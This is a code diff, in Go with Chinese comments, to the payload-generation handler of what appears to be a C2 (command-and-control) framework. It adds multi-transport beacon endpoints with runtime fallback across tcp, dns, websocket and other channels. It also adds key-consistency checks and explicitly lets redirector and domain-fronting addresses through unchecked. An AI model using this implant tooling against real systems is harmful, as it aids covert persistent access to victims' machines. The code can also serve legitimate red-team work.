@@ -71,6 +71,9 @@ func GenServer(c *gin.Context) {
 		AutoDelete          string `json:"autoDelete"`
 		UserAgent           string `json:"userAgent"`
 		ProfileName         string `json:"profileName"` // C2 Profile（profiles/*.yaml），空=default
+		// Endpoints 多传输端点列表（"scheme://addr,scheme://addr"，可选）。
+		// 非空时使用 multi 模板：客户端按端点顺序在运行时切换传输。
+		Endpoints string `json:"endpoints"`
 	}
 	if err := c.BindJSON(&serverBody); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -102,6 +105,21 @@ func GenServer(c *gin.Context) {
 	connectAddress = resolveListenerAddress(connectAddress, "connect")
 	// https 有独立客户端目录 server/https（含 https_ 前缀二进制）
 	binaryDir := listenerType
+
+	// 多传输载荷：listener 仍作为**密钥/画像来源**（主监听器），endpoints 指定运行时
+	// 依次尝试的端点列表。全部端点必须与主监听器使用同一套 VKey/盐 —— 一个二进制
+	// 只能携带一份密钥配置（首次连接前没有通道可以下发别的密钥）。
+	endpoints := strings.TrimSpace(serverBody.Endpoints)
+	var endpointList []string
+	if endpoints != "" {
+		var epErr string
+		endpointList, epErr = validateMultiEndpoints(endpoints)
+		if epErr != "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": epErr})
+			return
+		}
+		binaryDir = "multi"
+	}
 
 	logx.Debugf("🔍 [SERVER-GEN] 解析前端传递的监听器: %s\n", serverBody.Listener)
 	logx.Debugf("🔍 [SERVER-GEN] 解析结果 - Type: %s, ConnectAddress: %s, BinaryDir: %s\n", listenerType, connectAddress, binaryDir)
@@ -317,8 +335,18 @@ func GenServer(c *gin.Context) {
 	if serverBody.UserAgent != "" {
 		profUA = serverBody.UserAgent // 显式传参优先
 	}
+	// 多传输：所有端点必须与主监听器使用同一套密钥（一个二进制只能带一份密钥配置）。
+	// 只对"库里有记录的监听器"校验，未注册的地址（如重定向器/域前置）放行。
+	if len(endpointList) > 0 {
+		if msg := checkEndpointKeyConsistency(endpointList, masterKey, encryptionSalt); msg != "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": msg})
+			return
+		}
+	}
+
 	modifiedData, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
 		ListenerConfig:      serverBody.Listener,
+		Endpoints:           strings.Join(endpointList, ","),
 		OS:                  osType,
 		Arch:                archType,
 		Pass:                serverBody.Pass,
@@ -678,4 +706,83 @@ func profileListenerMismatch(p, def *c2profile.Profile) string {
 	return "该画像的监听器侧特征与 default 不一致，生成后会连不上：" +
 		strings.Join(diffs, "；") +
 		"。监听器目前只按 default 画像注册（per-listener 画像尚未实现），请修改 default.yaml 并重启监听器，或使用与 default 一致的画像。"
+}
+
+// validateMultiEndpoints 校验并归一化多传输端点列表。
+// 返回 (归一化后的端点, 错误信息)；错误信息为空表示通过。
+func validateMultiEndpoints(raw string) ([]string, string) {
+	supported := map[string]bool{
+		"tcp": true, "kcp": true, "http": true, "https": true, "oss": true,
+		"websocket": true, "ws": true, "dns": true,
+		"tcp_forward": true, "kcp_forward": true, "ws_forward": true,
+		"http_forward": true, "https_forward": true,
+	}
+	out := make([]string, 0, 4)
+	seen := map[string]bool{}
+	for _, item := range strings.Split(raw, ",") {
+		item = strings.TrimSpace(item)
+		if item == "" {
+			continue
+		}
+		parts := strings.SplitN(item, "://", 2)
+		if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
+			return nil, "端点格式必须是 scheme://address: " + item
+		}
+		scheme := strings.ToLower(strings.TrimSpace(parts[0]))
+		if !supported[scheme] {
+			return nil, "不支持的端点传输类型: " + scheme
+		}
+		if scheme == "ws" {
+			scheme = "websocket"
+		}
+		normalized := scheme + "://" + strings.TrimSpace(parts[1])
+		if seen[normalized] {
+			continue
+		}
+		seen[normalized] = true
+		out = append(out, normalized)
+	}
+	if len(out) == 0 {
+		return nil, "端点列表为空"
+	}
+	if len(out) > 8 {
+		return nil, "端点数量过多（上限 8 个）"
+	}
+	if len(strings.Join(out, ",")) > len(delivery.MultiEndpointsPlaceholder) {
+		return nil, "端点列表总长度超限（模板占位符 512 字节）"
+	}
+	return out, ""
+}
+
+// checkEndpointKeyConsistency 校验多传输端点与主监听器的密钥是否一致。
+//
+// 客户端二进制只能携带一份 VKey/盐（首次连接前没有通道下发别的密钥）。若端点指向
+// 另一个密钥不同的监听器，beacon 切过去之后服务端用另一套密钥派生会话，握手必然失败
+// —— 而现场只表现为"切到备用通道就掉线"，极难排查。这里提前拒绝。
+func checkEndpointKeyConsistency(endpoints []string, masterKey, salt []byte) string {
+	if database.Engine == nil {
+		return ""
+	}
+	masterStr := strings.TrimRight(string(masterKey), "\x00")
+	saltStr := strings.TrimRight(string(salt), "\x00")
+	for _, ep := range endpoints {
+		parts := strings.SplitN(ep, "://", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		addr := parts[1]
+		var lis database.Listener
+		has, err := database.Engine.Where("connect_address = ? OR listen_address = ?", addr, addr).Get(&lis)
+		if err != nil || !has {
+			continue // 未注册的地址（重定向器/域前置）不校验
+		}
+		if lis.VKey == "" || lis.EncryptionSalt == "" {
+			continue
+		}
+		if lis.VKey != masterStr || lis.EncryptionSalt != saltStr {
+			return "端点 " + addr + " 对应监听器的密钥与主监听器不一致；多传输载荷只能携带一套密钥，" +
+				"请改用相同 VKey/盐的监听器"
+		}
+	}
+	return ""
 }
